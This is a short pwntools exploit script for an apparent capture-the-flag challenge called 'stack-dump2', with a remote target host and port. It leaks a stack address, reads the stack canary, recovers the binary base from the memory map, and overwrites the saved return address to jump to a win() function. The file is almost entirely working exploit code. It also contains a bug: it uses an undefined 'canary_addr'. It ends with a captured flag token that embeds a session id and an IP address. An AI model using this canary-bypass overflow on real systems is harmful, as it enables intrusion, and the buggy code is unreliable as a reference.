#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./stack-dump2"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 5002

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

def input_data(len, data):
    p.sendlineafter("quit\n", "a")
    p.sendlineafter("len:", str(len))
    p.sendline(data)

def dump_memory():
    p.sendlineafter("quit\n", "b")
    p.recvuntil(": ")
    return p.recvline()

def leak_base():
    p.sendlineafter("quit\n", "c")
    p.recvline()

    base = p.recvuntil("-", drop=True)
    p.recvuntil("[stack]")

    return int(base, 16)

start()

# Leak the address of the canary
p.recvuntil("pointer ")
var75_addr  = int(p.recvline().strip(), 16)
canary = var75_addr + (0x75 - 0xC)

# Find the value of the canary
input_data(5, p32(canary_addr))
canary = dump_memory()[:4]

# Find the binary base from the memory map
elf.address = leak_base()

# Overwrite EIP with win() and the canary with the leaked canary value
payload = b"A" * 0x60
payload += canary
payload += b"A" * 0x8
payload += p32(elf.symbols["win"] - 0x1000)
input_data(len(payload) + 1, payload)

p.sendlineafter("quit\n", "d")

p.interactive()
p.close()

# FLAG = FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zdGFjay1kdW1wMiIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiYzliMTUzYWYtMjAyMi00NWUzLThlMDYtNTc1MDFhZGU1NjcxIn0.ojSWxnBJ49VcEKrxOzOfe9laeC0Ni59l7DgBi11rOxk}